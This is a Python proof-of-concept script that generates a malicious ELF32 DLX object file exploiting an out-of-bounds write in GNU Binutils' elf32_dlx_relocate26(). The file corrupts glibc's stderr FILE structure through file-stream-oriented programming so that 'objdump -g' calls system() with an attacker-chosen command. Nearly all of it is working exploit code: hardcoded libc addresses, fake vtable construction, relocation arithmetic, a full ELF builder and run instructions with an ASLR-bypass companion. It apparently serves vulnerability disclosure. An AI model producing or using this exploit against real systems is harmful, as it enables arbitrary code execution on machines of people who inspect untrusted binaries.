"""
Malicious ELF Generator — GNU Binutils objdump DLX OOB Write -> FSOP -> ACE

Generates a crafted ELF32 DLX relocatable object (exploit.bin) that exploits
an out-of-bounds write vulnerability in bfd/elf32-dlx.c to achieve arbitrary
code execution when processed by `objdump -g`.

This script produces the payload. To execute the full exploit with ASLR bypass,
use poc_ptrace.py (ptrace-based, no GDB required).

Product:      GNU Binutils (all versions through current HEAD)
Component:    bfd/elf32-dlx.c — elf32_dlx_relocate26()
Type:         CWE-787 (Out-of-bounds Write)
Impact:       Arbitrary code execution via FSOP
Tested on:    Debian 13 (Trixie), glibc 2.41, x86_64

USAGE
-----
  # Generate payload
  python3 poc_generate.py                     # default cmd="ps"
  python3 poc_generate.py --cmd ps -o exploit.bin

  # Execute (ASLR on, standalone, no GDB)
  python3 poc_ptrace.py

  # Execute (ASLR off, manual)
  setarch -R ./binutils-gdb/build/binutils/objdump -g exploit.bin

VULNERABILITY
-------------
elf32_dlx_relocate26() writes at data + reloc_entry->address without
bounds checking. By using R_DLX_RELOC_26_PCREL relocations with offsets
beyond the section size, an attacker can write into adjacent mmap'd
memory — specifically libc's _IO_2_1_stderr_ structure.

EXPLOITATION CHAIN (FSOP)
-------------------------
4 OOB PCREL26 relocations corrupt _IO_2_1_stderr_ fields:

  1. _flags[0:3]      <- command bytes (e.g., "ps\\0")
  2. _IO_write_ptr    <- non-zero (triggers flush -> _IO_wfile_overflow)
  3. _wide_data[0:3]  <- pointer to fake _IO_wide_data in section buffer
  4. vtable[0:3]      <- _IO_wfile_jumps (enters wide file code path)

Execution flow when objdump writes to stderr:
  _IO_wfile_overflow -> _IO_wdoallocbuf -> _IO_WDOALLOCATE
  = stderr->_wide_data->_wide_vtable->__doallocate(stderr)
  = system(stderr)  // _flags contains the command string

COMMAND CONSTRAINTS
-------------------
The command is encoded in _flags (3-byte write). It must be exactly
2 ASCII characters (byte[2] = null terminator) satisfying:

  cmd[0] & 0x02 == 0   (_IO_UNBUFFERED must not be set)
  cmd[0] & 0x08 == 0   (_IO_NO_WRITES must not be set)
  cmd[1] & 0x20 != 0   (_IO_IS_FILEBUF must be set)

Valid: "ps" (0x70, 0x73)  |  Invalid: "ls" (0x6C has bit 3 set)
"""

import argparse
import struct
import sys
from pathlib import Path

# ELF/DLX constants

EM_DLX               = 0x5AA5      # e_machine value for DLX architecture
ET_REL                = 1           # ELF type: relocatable object
EV_CURRENT            = 1           # ELF version
ELFCLASS32            = 1           # 32-bit ELF
ELFDATA2MSB           = 2           # big-endian
R_DLX_RELOC_26_PCREL  = 9           # relocation type (no bounds check)
MASK26                = 0x03FFFFFF  # 26-bit mask for PCREL26

# Profiled addresses (ASLR disabled, Debian 13, glibc 2.41)
# These are used to pre-compute relocation values in the ELF payload.
# With ASLR enabled, poc_ptrace.py recalculates them at runtime.

DATA_ADDR      = 0x7FFFF7D8D010   # section buffer (mmap'd, >= 128 KB)
STDERR_ADDR    = 0x7FFFF7FA74E0   # _IO_2_1_stderr_
SYSTEM_ADDR    = 0x7FFFF7E14110   # system()
IO_FILE_JUMPS  = 0x7FFFF7FA5030   # _IO_file_jumps
IO_WFILE_JUMPS = 0x7FFFF7FA5228   # _IO_wfile_jumps

# Section layout

DEBUG_SIZE      = 0x30000   # 192 KB — large enough to trigger mmap() allocation
FAKE_WDATA_OFF  = 0x1000    # offset in buffer: fake _IO_wide_data struct
FAKE_VTABLE_OFF = 0x2000    # offset in buffer: fake _IO_jump_t (vtable)

# _IO_FILE field offsets

OFF_WRITE_PTR   = 0x28      # _IO_write_ptr
OFF_WIDE_DATA   = 0xA0      # _wide_data
OFF_VTABLE      = 0xD8      # vtable

# Fake structure field offsets

OFF_WIDE_VTABLE = 0xE0      # _IO_wide_data._wide_vtable
OFF_DOALLOCATE  = 0x68      # _IO_jump_t.__doallocate


# Binary packing helpers (big-endian ELF32)

def p16(v: int) -> bytes:
    """Pack a 16-bit big-endian value."""
    return struct.pack(">H", v & 0xFFFF)


def p32(v: int) -> bytes:
    """Pack a 32-bit big-endian value."""
    return struct.pack(">I", v & 0xFFFFFFFF)


def p64le(v: int) -> bytes:
    """Pack a 64-bit little-endian value (for in-memory struct fields)."""
    return struct.pack("<Q", v & 0xFFFFFFFFFFFFFFFF)


# ELF string table / symbol table builders

def build_strtab(strings: list[str]) -> tuple[bytes, dict[str, int]]:
    """Build an ELF string table. Returns (blob, {name: offset})."""
    blob = b"\x00"
    offsets = {"": 0}
    for s in strings:
        if s and s not in offsets:
            offsets[s] = len(blob)
            blob += s.encode() + b"\x00"
    return blob, offsets


def build_sym(st_name: int, st_value: int, st_size: int,
              st_info: int, st_shndx: int) -> bytes:
    """Build an ELF32 symbol table entry (big-endian)."""
    return p32(st_name) + p32(st_value) + p32(st_size) + bytes([st_info, 0]) + p16(st_shndx)


# FSOP chain builder

class FSOPChain:
    """
    Constructs the 4 OOB PCREL26 relocations that corrupt _IO_2_1_stderr_
    to redirect execution through the wide file vtable to system().

    The FSOP path requires specific _flags constraints:
      cmd[0] & 0x02 == 0   (_IO_UNBUFFERED not set -> wdoallocbuf calls __doallocate)
      cmd[0] & 0x08 == 0   (_IO_NO_WRITES not set  -> overflow doesn't return WEOF)
      cmd[1] & 0x20 != 0   (_IO_IS_FILEBUF set     -> enters doallocate block)
    """

    def __init__(self, data_addr: int, stderr_addr: int, system_addr: int,
                 wfile_jumps: int, cmd: str = "ps"):
        if len(cmd) < 2:
            raise ValueError("Command must be at least 2 characters")

        b = (cmd + "\x00\x00\x00").encode()[:3]
        if b[0] & 0x0A:
            raise ValueError(
                f"cmd[0]=0x{b[0]:02x} violates _IO_UNBUFFERED/_IO_NO_WRITES constraint"
            )
        if not (b[1] & 0x20):
            raise ValueError(
                f"cmd[1]=0x{b[1]:02x}: _IO_IS_FILEBUF (bit 5) not set"
            )

        self.data_addr = data_addr
        self.stderr_addr = stderr_addr
        self.system_addr = system_addr
        self.wfile_jumps = wfile_jumps
        self.cmd_low26 = (b[0] << 16) | (b[1] << 8) | b[2]

        # Build section buffer with fake FSOP structures
        self.section = bytearray(DEBUG_SIZE)
        self._place_fake_structs()

    def _place_fake_structs(self):
        """Write fake _IO_wide_data and fake vtable into the section buffer."""
        fake_wdata = self.data_addr + FAKE_WDATA_OFF
        fake_vtable = self.data_addr + FAKE_VTABLE_OFF

        # fake_wdata._wide_vtable -> fake_vtable
        off = FAKE_WDATA_OFF + OFF_WIDE_VTABLE
        self.section[off:off + 8] = p64le(fake_vtable)

        # fake_vtable.__doallocate -> system()
        off = FAKE_VTABLE_OFF + OFF_DOALLOCATE
        self.section[off:off + 8] = p64le(self.system_addr)

    def _compute_sym_value(self, desired_low26: int, cur_be32: int) -> tuple[int, int]:
        """
        Compute the symbol value needed so that the PCREL26 relocation
        writes desired_low26 over the current BE32 word.

        Returns (sym_value, raw_val) where raw_val is the intermediate
        relocation value before masking.
        """
        vallo = cur_be32 & MASK26
        if vallo & 0x03000000:
            vallo = (~(vallo | 0xFC000000) + 1) & 0xFFFFFFFF

        val = (desired_low26 - 0x04000000) if (desired_low26 & 0x02000000) else desired_low26
        assert abs(val) <= 0x01FFFFFF, f"val={val:#x} out of PCREL26 range"

        return (val + vallo) & 0xFFFFFFFF, val

    def build(self, mem: dict[int, int]) -> list[dict]:
        """
        Build the 4 relocation entries for the FSOP chain.

        Args:
            mem: dict mapping {offset_from_data: current_be32_value}
                 for each OOB target location.

        Returns:
            List of relocation dicts ready for build_elf().
        """
        relocs = []

        def add(target_addr: int, desired_low26: int, desc: str):
            off = (target_addr - self.data_addr) & 0xFFFFFFFF
            cur = mem.get(off, 0)
            sv, val = self._compute_sym_value(desired_low26, cur)
            relocs.append({
                "offset": off,
                "symbol_value": sv,
                "val": val,
                "desired_low26": desired_low26,
                "description": desc,
            })

        # Reloc 0: _flags[0:3] = command bytes (unaligned write at stderr - 1)
        cmd_char = chr((self.cmd_low26 >> 16) & 0xFF)
        add(
            self.stderr_addr - 1,
            self.cmd_low26 & MASK26,
            f"_flags = cmd bytes 0x{self.cmd_low26:06x} -> system(fp) = system({cmd_char!r}...)",
        )

        # Reloc 1: _IO_write_ptr != 0 -> triggers flush via _IO_wfile_overflow
        add(
            self.stderr_addr + OFF_WRITE_PTR,
            0x00000001,
            "_IO_write_ptr := 1",
        )

        # Reloc 2: _wide_data -> fake_wdata (unaligned write at stderr + 0x9F)
        # Only writes 3 low bytes; upper bytes stay the same (same mmap region)
        wdb = (self.data_addr + FAKE_WDATA_OFF).to_bytes(8, "little")
        add(
            self.stderr_addr + OFF_WIDE_DATA - 1,
            (wdb[0] << 16) | (wdb[1] << 8) | wdb[2],
            "_wide_data[0:3] := fake_wdata addr (bytes 3-7 unchanged, same mmap region)",
        )

        # Reloc 3: vtable -> _IO_wfile_jumps (unaligned write at stderr + 0xD7)
        wfb = self.wfile_jumps.to_bytes(8, "little")
        add(
            self.stderr_addr + OFF_VTABLE - 1,
            (wfb[0] << 16) | (wfb[1] << 8) | wfb[2],
            "vtable[0:3] := _IO_wfile_jumps addr",
        )

        return relocs


# ELF construction

def build_elf(section_content: bytes | bytearray, relocs: list[dict]) -> bytes:
    """
    Build a complete ELF32 DLX relocatable object file.

    Sections: .text, .debug_info (payload), .rel.debug_info (OOB relocs),
              .symtab, .strtab, .shstrtab

    Args:
        section_content: raw bytes for .debug_info (contains fake FSOP structs)
        relocs: list of relocation dicts from FSOPChain.build()

    Returns:
        Complete ELF binary as bytes.
    """
    debug_data = bytes(section_content)
    text_data = b"\x00" * 4    # minimal .text section

    # Section header string table
    sec_names = [".text", ".debug_info", ".rel.debug_info",
                 ".symtab", ".strtab", ".shstrtab"]
    shstrtab, shstr_off = build_strtab(sec_names)

    # Symbol string table
    sym_names = [f"s{i}" for i in range(len(relocs))]
    strtab, str_off = build_strtab(sym_names)

    # Symbol table
    symtab  = build_sym(0, 0, 0, 0,    0)       # [0] STN_UNDEF (null)
    symtab += build_sym(0, 0, 0, 0x03, 1)       # [1] .text section symbol
    symtab += build_sym(0, 0, 0, 0x03, 2)       # [2] .debug_info section symbol
    for i, r in enumerate(relocs):               # [3+] relocation symbols
        symtab += build_sym(str_off[f"s{i}"], r["symbol_value"], 4, 0x12, 2)

    # Relocation entries (REL format: offset + info)
    rel_data = b""
    for i, r in enumerate(relocs):
        sym_idx = 3 + i
        rel_data += p32(r["offset"]) + p32((sym_idx << 8) | R_DLX_RELOC_26_PCREL)

    # Compute file layout (ELF32 header = 52 bytes)
    offset = 52
    text_off    = offset; offset += len(text_data)
    debug_off   = offset; offset += len(debug_data)
    rel_off     = offset; offset += len(rel_data)
    sym_off     = offset; offset += len(symtab)
    str_off_f   = offset; offset += len(strtab)
    shstr_off_f = offset; offset += len(shstrtab)
    shdr_off    = offset

    # Section headers (7 entries)
    def shdr(name, sh_type, sh_flags, sh_offset, sh_size,
             sh_link, sh_info, sh_addralign, sh_entsize):
        return (p32(name) + p32(sh_type) + p32(sh_flags) + p32(0)
                + p32(sh_offset) + p32(sh_size) + p32(sh_link) + p32(sh_info)
                + p32(sh_addralign) + p32(sh_entsize))

    shdrs  = shdr(0, 0, 0, 0, 0, 0, 0, 0, 0)                                              # NULL
    shdrs += shdr(shstr_off[".text"],           1, 6,    text_off,    len(text_data),    0, 0, 4,  0)
    shdrs += shdr(shstr_off[".debug_info"],     1, 0,    debug_off,   len(debug_data),   0, 0, 1,  0)
    shdrs += shdr(shstr_off[".rel.debug_info"], 9, 0x40, rel_off,     len(rel_data),     4, 2, 4,  8)
    shdrs += shdr(shstr_off[".symtab"],         2, 0,    sym_off,     len(symtab),       5, 3, 4, 16)
    shdrs += shdr(shstr_off[".strtab"],         3, 0,    str_off_f,   len(strtab),       0, 0, 1,  0)
    shdrs += shdr(shstr_off[".shstrtab"],       3, 0,    shstr_off_f, len(shstrtab),     0, 0, 1,  0)

    # ELF header
    e_ident = b"\x7fELF" + bytes([ELFCLASS32, ELFDATA2MSB, EV_CURRENT, 0]) + b"\x00" * 8
    ehdr = (e_ident
            + p16(ET_REL)           # e_type: relocatable
            + p16(EM_DLX)           # e_machine: DLX
            + p32(EV_CURRENT)       # e_version
            + p32(0)                # e_entry
            + p32(0)                # e_phoff
            + p32(shdr_off)         # e_shoff
            + p32(0)                # e_flags
            + p16(52)               # e_ehsize
            + p16(0)                # e_phentsize
            + p16(0)                # e_phnum
            + p16(40)               # e_shentsize
            + p16(7)                # e_shnum
            + p16(6))               # e_shstrndx

    return ehdr + text_data + debug_data + rel_data + symtab + strtab + shstrtab + shdrs


# Payload generation

def generate(cmd: str = "ps") -> tuple[list[dict], bytearray]:
    """
    Generate the FSOP chain and section content for the given command.

    Uses profiled addresses (ASLR off). When used with poc_ptrace.py,
    the ptrace wrapper recalculates ASLR-dependent values at runtime.

    Returns:
        (relocs, section_content) tuple ready for build_elf().
    """
    chain = FSOPChain(DATA_ADDR, STDERR_ADDR, SYSTEM_ADDR, IO_WFILE_JUMPS, cmd)

    # Current BE32 values at OOB target locations (measured under GDB, ASLR off).
    # These represent what's already in memory before the OOB write.
    mem = {}

    # _flags: glibc initializes _IO_2_1_stderr_._flags = 0xFBAD2086
    # Byte at stderr-1 = 0x00 (end of preceding NULL field)
    # Bytes at stderr+0,+1,+2 = 0x86, 0x20, 0xAD (LE encoding)
    mem[(STDERR_ADDR - 1 - DATA_ADDR) & 0xFFFFFFFF] = 0x008620AD

    # _IO_write_ptr: NULL at process start
    mem[(STDERR_ADDR + 0x28 - DATA_ADDR) & 0xFFFFFFFF] = 0x00000000

    # _wide_data: pointer to _IO_wide_data_2_1_stderr_ (ASLR-dependent low bytes)
    mem[(STDERR_ADDR + 0x9F - DATA_ADDR) & 0xFFFFFFFF] = 0x00E066FA

    # vtable: pointer to _IO_file_jumps (ASLR-dependent low bytes)
    fj = IO_FILE_JUMPS.to_bytes(8, "little")
    mem[(STDERR_ADDR + 0xD7 - DATA_ADDR) & 0xFFFFFFFF] = (fj[0] << 16) | (fj[1] << 8) | fj[2]

    return chain.build(mem), chain.section


# Entry point

def main():
    parser = argparse.ArgumentParser(
        description="Generate malicious DLX ELF for GNU Binutils objdump OOB Write -> FSOP -> ACE",
        epilog=(
            "After generating, run the exploit with:\n"
            "  python3 poc_ptrace.py          # ASLR on, standalone\n"
            "  setarch -R objdump -g exploit.bin  # ASLR off, manual"
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument(
        "-o", "--out", type=Path, default=Path("exploit.bin"),
        help="Output file path (default: exploit.bin)",
    )
    parser.add_argument(
        "--cmd", default="ps",
        help=(
            "Command to execute (2 chars). "
            "Must satisfy: cmd[0] & 0x0A == 0, cmd[1] & 0x20 != 0. "
            "Default: 'ps'"
        ),
    )
    args = parser.parse_args()

    try:
        relocs, section = generate(args.cmd)
    except (ValueError, AssertionError) as e:
        sys.exit(f"[!] {e}")

    print("=== RELOCATIONS ===")
    for i, r in enumerate(relocs):
        print(
            f"  [{i}] off={r['offset']:#010x}  symval={r['symbol_value']:#010x}"
            f"  low26={r['desired_low26']:#010x}  | {r['description']}"
        )

    elf = build_elf(section, relocs)
    args.out.write_bytes(elf)

    print(f"\n[+] {args.out} written ({len(elf):,} bytes)")
    print(f"\n# ASLR off:")
    print(f"  setarch -R ./binutils-gdb/build/binutils/objdump -g {args.out}")
    print(f"# ASLR on (standalone, no GDB):")
    print(f"  python3 poc_ptrace.py")


if __name__ == "__main__":
    main()
